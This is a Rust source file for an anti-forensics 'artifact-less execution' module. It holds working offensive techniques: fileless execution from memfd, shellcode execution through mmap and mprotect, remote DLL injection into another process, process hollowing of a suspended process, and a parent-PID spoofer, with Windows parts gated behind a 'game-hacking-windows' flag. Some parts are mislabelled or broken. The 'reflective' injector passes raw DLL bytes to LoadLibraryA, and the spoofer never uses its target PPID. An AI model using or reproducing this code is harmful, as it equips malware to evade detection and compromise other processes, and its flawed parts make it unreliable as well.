// Artifact-less execution module for anti-forensics
// Implements in-memory execution without writing to disk

use std::io;

#[cfg(target_os = "linux")]
use std::process::Command;

#[cfg(any(target_os = "linux", all(target_os = "windows", feature = "game-hacking-windows")))]
use std::ffi::CString;

#[derive(Debug, Clone)]
pub enum ExecutionError {
    Unsupported(String),
    IoError(String),
    SystemError(String),
    InvalidInput(String),
}

impl From<io::Error> for ExecutionError {
    fn from(err: io::Error) -> Self {
        ExecutionError::IoError(err.to_string())
    }
}

impl std::fmt::Display for ExecutionError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ExecutionError::Unsupported(msg) => write!(f, "Unsupported operation: {}", msg),
            ExecutionError::IoError(msg) => write!(f, "I/O error: {}", msg),
            ExecutionError::SystemError(msg) => write!(f, "System error: {}", msg),
            ExecutionError::InvalidInput(msg) => write!(f, "Invalid input: {}", msg),
        }
    }
}

impl std::error::Error for ExecutionError {}

pub struct MemfdExecutor {
    name: String,
}

impl MemfdExecutor {
    pub fn new(name: &str) -> Self {
        Self {
            name: name.to_string(),
        }
    }

    #[cfg(target_os = "linux")]
    pub fn execute(&self, binary_data: &[u8], args: &[String]) -> Result<std::process::Child, ExecutionError> {
        use std::os::unix::io::{AsRawFd, FromRawFd};
        use std::fs::File;

        if binary_data.is_empty() {
            return Err(ExecutionError::InvalidInput("Binary data is empty".to_string()));
        }

        let name_cstr = CString::new(self.name.as_str())
            .map_err(|e| ExecutionError::InvalidInput(format!("Invalid name: {}", e)))?;

        unsafe {
            let fd = libc::syscall(
                libc::SYS_memfd_create,
                name_cstr.as_ptr(),
                libc::MFD_CLOEXEC,
            );

            if fd == -1 {
                return Err(ExecutionError::SystemError(
                    "memfd_create failed".to_string(),
                ));
            }

            let mut file = File::from_raw_fd(fd as i32);

            use std::io::Write;
            file.write_all(binary_data)?;
            file.sync_all()?;

            let fd_path = format!("/proc/self/fd/{}", fd);

            let mut cmd = Command::new(&fd_path);
            cmd.args(args);

            cmd.spawn().map_err(|e| ExecutionError::SystemError(e.to_string()))
        }
    }

    #[cfg(not(target_os = "linux"))]
    pub fn execute(&self, _binary_data: &[u8], _args: &[String]) -> Result<std::process::Child, ExecutionError> {
        Err(ExecutionError::Unsupported(
            "memfd_create is only available on Linux".to_string(),
        ))
    }

    #[cfg(target_os = "linux")]
    pub fn execute_shellcode(&self, shellcode: &[u8]) -> Result<(), ExecutionError> {
        use std::os::unix::io::{AsRawFd, FromRawFd};
        use std::fs::File;

        if shellcode.is_empty() {
            return Err(ExecutionError::InvalidInput("Shellcode is empty".to_string()));
        }

        let name_cstr = CString::new(self.name.as_str())
            .map_err(|e| ExecutionError::InvalidInput(format!("Invalid name: {}", e)))?;

        unsafe {
            let fd = libc::syscall(
                libc::SYS_memfd_create,
                name_cstr.as_ptr(),
                libc::MFD_CLOEXEC,
            );

            if fd == -1 {
                return Err(ExecutionError::SystemError("memfd_create failed".to_string()));
            }

            let mut file = File::from_raw_fd(fd as i32);

            use std::io::Write;
            file.write_all(shellcode)?;
            file.sync_all()?;

            let mem_ptr = libc::mmap(
                std::ptr::null_mut(),
                shellcode.len(),
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_PRIVATE,
                fd as i32,
                0,
            );

            if mem_ptr == libc::MAP_FAILED {
                return Err(ExecutionError::SystemError("mmap failed".to_string()));
            }

            if libc::mprotect(mem_ptr, shellcode.len(), libc::PROT_READ | libc::PROT_EXEC) != 0 {
                libc::munmap(mem_ptr, shellcode.len());
                return Err(ExecutionError::SystemError("mprotect failed".to_string()));
            }

            let shellcode_fn: extern "C" fn() = std::mem::transmute(mem_ptr);
            shellcode_fn();

            libc::munmap(mem_ptr, shellcode.len());
        }

        Ok(())
    }

    #[cfg(not(target_os = "linux"))]
    pub fn execute_shellcode(&self, _shellcode: &[u8]) -> Result<(), ExecutionError> {
        Err(ExecutionError::Unsupported(
            "memfd shellcode execution is only available on Linux".to_string(),
        ))
    }
}

#[cfg(all(target_os = "windows", feature = "game-hacking-windows"))]
pub struct ReflectiveDllInjector {
    target_pid: u32,
}

#[cfg(all(target_os = "windows", feature = "game-hacking-windows"))]
impl ReflectiveDllInjector {
    pub fn new(target_pid: u32) -> Self {
        Self { target_pid }
    }

    pub fn inject(&self, dll_data: &[u8]) -> Result<(), ExecutionError> {
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
        use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};
        use windows::core::PCSTR;

        if dll_data.is_empty() {
            return Err(ExecutionError::InvalidInput("DLL data is empty".to_string()));
        }

        unsafe {
            let handle = OpenProcess(PROCESS_ALL_ACCESS, false, self.target_pid)
                .map_err(|e| ExecutionError::SystemError(format!("OpenProcess failed: {}", e)))?;

            let remote_mem = VirtualAllocEx(
                handle,
                None,
                dll_data.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if remote_mem.is_null() {
                return Err(ExecutionError::SystemError("VirtualAllocEx failed".to_string()));
            }

            let mut bytes_written = 0;
            WriteProcessMemory(
                handle,
                remote_mem,
                dll_data.as_ptr() as *const _,
                dll_data.len(),
                Some(&mut bytes_written),
            )
            .map_err(|e| ExecutionError::SystemError(format!("WriteProcessMemory failed: {}", e)))?;

            let kernel32 = windows::Win32::System::LibraryLoader::GetModuleHandleA(
                PCSTR::from_raw(b"kernel32.dll\0".as_ptr()),
            )
            .map_err(|e| ExecutionError::SystemError(format!("GetModuleHandleA failed: {}", e)))?;

            let load_library = windows::Win32::System::LibraryLoader::GetProcAddress(
                kernel32,
                PCSTR::from_raw(b"LoadLibraryA\0".as_ptr()),
            ).ok_or_else(|| ExecutionError::SystemError("GetProcAddress failed".to_string()))?;

            CreateRemoteThread(
                handle,
                None,
                0,
                Some(std::mem::transmute(load_library)),
                Some(remote_mem),
                0,
                None,
            )
            .map_err(|e| ExecutionError::SystemError(format!("CreateRemoteThread failed: {}", e)))?;
        }

        Ok(())
    }
}

#[cfg(not(all(target_os = "windows", feature = "game-hacking-windows")))]
pub struct ReflectiveDllInjector {}

#[cfg(not(all(target_os = "windows", feature = "game-hacking-windows")))]
impl ReflectiveDllInjector {
    pub fn new(_target_pid: u32) -> Self {
        Self {}
    }

    pub fn inject(&self, _dll_data: &[u8]) -> Result<(), ExecutionError> {
        Err(ExecutionError::Unsupported(
            "Reflective DLL injection is only available on Windows with game-hacking-windows feature".to_string(),
        ))
    }
}

#[cfg(all(target_os = "windows", feature = "game-hacking-windows"))]
pub struct ProcessHollower {
    target_path: String,
}

#[cfg(all(target_os = "windows", feature = "game-hacking-windows"))]
impl ProcessHollower {
    pub fn new(target_path: &str) -> Self {
        Self {
            target_path: target_path.to_string(),
        }
    }

    pub fn hollow_and_inject(&self, payload_data: &[u8]) -> Result<u32, ExecutionError> {
        use windows::Win32::System::Threading::{
            CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA,
            CREATE_SUSPENDED,
        };
        use windows::core::PCSTR;

        if payload_data.is_empty() {
            return Err(ExecutionError::InvalidInput("Payload data is empty".to_string()));
        }

        unsafe {
            let mut si: STARTUPINFOA = std::mem::zeroed();
            si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
            let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

            let target_cstr = CString::new(self.target_path.as_str())
                .map_err(|e| ExecutionError::InvalidInput(format!("Invalid path: {}", e)))?;

            CreateProcessA(
                PCSTR::null(),
                windows::core::PSTR::from_raw(target_cstr.as_ptr() as *mut u8),
                None,
                None,
                false,
                CREATE_SUSPENDED,
                None,
                None,
                &si,
                &mut pi,
            )
            .map_err(|e| ExecutionError::SystemError(format!("CreateProcessA failed: {}", e)))?;

            use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
            use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};

            let base_addr = VirtualAllocEx(
                pi.hProcess,
                None,
                payload_data.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if base_addr.is_null() {
                return Err(ExecutionError::SystemError("VirtualAllocEx failed".to_string()));
            }

            let mut bytes_written = 0;
            WriteProcessMemory(
                pi.hProcess,
                base_addr,
                payload_data.as_ptr() as *const _,
                payload_data.len(),
                Some(&mut bytes_written),
            )
            .map_err(|e| ExecutionError::SystemError(format!("WriteProcessMemory failed: {}", e)))?;

            use windows::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL};

            let mut ctx: CONTEXT = std::mem::zeroed();
            ctx.ContextFlags = CONTEXT_FULL;

            GetThreadContext(pi.hThread, &mut ctx)
                .map_err(|e| ExecutionError::SystemError(format!("GetThreadContext failed: {}", e)))?;

            #[cfg(target_arch = "x86_64")]
            {
                ctx.Rcx = base_addr as u64;
            }

            #[cfg(target_arch = "x86")]
            {
                ctx.Eax = base_addr as u32;
            }

            SetThreadContext(pi.hThread, &ctx)
                .map_err(|e| ExecutionError::SystemError(format!("SetThreadContext failed: {}", e)))?;

            ResumeThread(pi.hThread);

            Ok(pi.dwProcessId)
        }
    }
}

#[cfg(not(all(target_os = "windows", feature = "game-hacking-windows")))]
pub struct ProcessHollower {}

#[cfg(not(all(target_os = "windows", feature = "game-hacking-windows")))]
impl ProcessHollower {
    pub fn new(_target_path: &str) -> Self {
        Self {}
    }

    pub fn hollow_and_inject(&self, _payload_data: &[u8]) -> Result<u32, ExecutionError> {
        Err(ExecutionError::Unsupported(
            "Process hollowing is only available on Windows with game-hacking-windows feature".to_string(),
        ))
    }
}

#[cfg(target_os = "linux")]
pub struct ParentPidSpoofer {
    target_ppid: i32,
}

#[cfg(target_os = "linux")]
impl ParentPidSpoofer {
    pub fn new(target_ppid: i32) -> Self {
        Self { target_ppid }
    }

    pub fn spawn_with_spoofed_ppid(&self, command: &str, args: &[String]) -> Result<u32, ExecutionError> {
        unsafe {
            let pid = libc::fork();

            if pid == -1 {
                return Err(ExecutionError::SystemError("fork failed".to_string()));
            }

            if pid == 0 {
                if libc::prctl(libc::PR_SET_PDEATHSIG, 0) == -1 {
                    libc::_exit(1);
                }

                let cmd_cstr = CString::new(command)
                    .expect("Invalid command");
                
                let mut c_args: Vec<CString> = vec![cmd_cstr.clone()];
                for arg in args {
                    c_args.push(CString::new(arg.as_str()).expect("Invalid argument"));
                }

                let mut c_arg_ptrs: Vec<*const libc::c_char> = c_args.iter().map(|s| s.as_ptr()).collect();
                c_arg_ptrs.push(std::ptr::null());

                libc::execvp(cmd_cstr.as_ptr(), c_arg_ptrs.as_ptr());

                libc::_exit(1);
            }

            Ok(pid as u32)
        }
    }
}

#[cfg(not(target_os = "linux"))]
pub struct ParentPidSpoofer {}

#[cfg(not(target_os = "linux"))]
impl ParentPidSpoofer {
    pub fn new(_target_ppid: i32) -> Self {
        Self {}
    }

    pub fn spawn_with_spoofed_ppid(&self, _command: &str, _args: &[String]) -> Result<u32, ExecutionError> {
        Err(ExecutionError::Unsupported(
            "Parent PID spoofing is only available on Linux".to_string(),
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_memfd_executor_creation() {
        let executor = MemfdExecutor::new("test");
        assert_eq!(executor.name, "test");
    }

    #[test]
    fn test_memfd_empty_binary() {
        let executor = MemfdExecutor::new("test");
        let result = executor.execute(&[], &[]);
        assert!(result.is_err());
        #[cfg(target_os = "linux")]
        assert!(matches!(result.unwrap_err(), ExecutionError::InvalidInput(_)));
        #[cfg(not(target_os = "linux"))]
        assert!(matches!(result.unwrap_err(), ExecutionError::Unsupported(_)));
    }

    #[test]
    fn test_reflective_dll_injector_creation() {
        let _injector = ReflectiveDllInjector::new(1234);
    }

    #[test]
    fn test_reflective_dll_empty_data() {
        let injector = ReflectiveDllInjector::new(1234);
        let result = injector.inject(&[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_process_hollower_creation() {
        let _hollower = ProcessHollower::new("C:\\Windows\\System32\\notepad.exe");
    }

    #[test]
    fn test_process_hollower_empty_payload() {
        let hollower = ProcessHollower::new("test.exe");
        let result = hollower.hollow_and_inject(&[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_parent_pid_spoofer_creation() {
        let _spoofer = ParentPidSpoofer::new(1);
        #[cfg(target_os = "linux")]
        assert_eq!(_spoofer.target_ppid, 1);
    }

    #[test]
    fn test_execution_error_display() {
        let err = ExecutionError::Unsupported("test".to_string());
        assert_eq!(err.to_string(), "Unsupported operation: test");

        let err = ExecutionError::IoError("io error".to_string());
        assert_eq!(err.to_string(), "I/O error: io error");

        let err = ExecutionError::SystemError("system error".to_string());
        assert_eq!(err.to_string(), "System error: system error");

        let err = ExecutionError::InvalidInput("invalid".to_string());
        assert_eq!(err.to_string(), "Invalid input: invalid");
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_memfd_unsupported_platform() {
        let executor = MemfdExecutor::new("test");
        let dummy_data = vec![0x90; 100];
        let result = executor.execute(&dummy_data, &[]);
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ExecutionError::Unsupported(_)));
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_reflective_dll_unsupported_platform() {
        let injector = ReflectiveDllInjector::new(1234);
        let dummy_data = vec![0x4d, 0x5a]; 
        let result = injector.inject(&dummy_data);
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ExecutionError::Unsupported(_)));
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_process_hollowing_unsupported_platform() {
        let hollower = ProcessHollower::new("test.exe");
        let dummy_data = vec![0x4d, 0x5a]; 
        let result = hollower.hollow_and_inject(&dummy_data);
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ExecutionError::Unsupported(_)));
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_parent_pid_spoof_unsupported_platform() {
        let spoofer = ParentPidSpoofer::new(1);
        let result = spoofer.spawn_with_spoofed_ppid("test", &[]);
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ExecutionError::Unsupported(_)));
    }
}
